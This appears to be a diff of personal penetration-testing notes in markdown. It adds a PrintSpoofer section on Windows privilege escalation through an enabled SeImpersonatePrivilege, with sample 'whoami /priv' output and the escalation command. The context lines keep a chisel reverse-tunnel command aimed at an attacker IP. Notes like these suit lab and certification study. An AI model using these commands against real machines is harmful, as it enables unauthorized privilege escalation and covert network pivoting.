@@ -30,4 +30,27 @@ $ chisel --help
 `chisel client <attacker ip:port{differnt port}> R:<attacker ip:port{different port1}>:<localhost:port{running port, need to be forwarded}>`   >> Run in Target Machine
  
 
-# 
+# PrinterSpoofer
+
+https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/  
+
+Windows privilege escalation, To achive this check for **Privilages Information** by 
+`whoami /priv'  
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+**SeImpersonatePrivilege        Impersonate a client after authentication Enabled**
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled  
+
+***SeImpersonatePrivilege*** need to be **Enabled**
+
+## Command for escaltion
+`PrinterSpoofer.exe -i -c cmd`
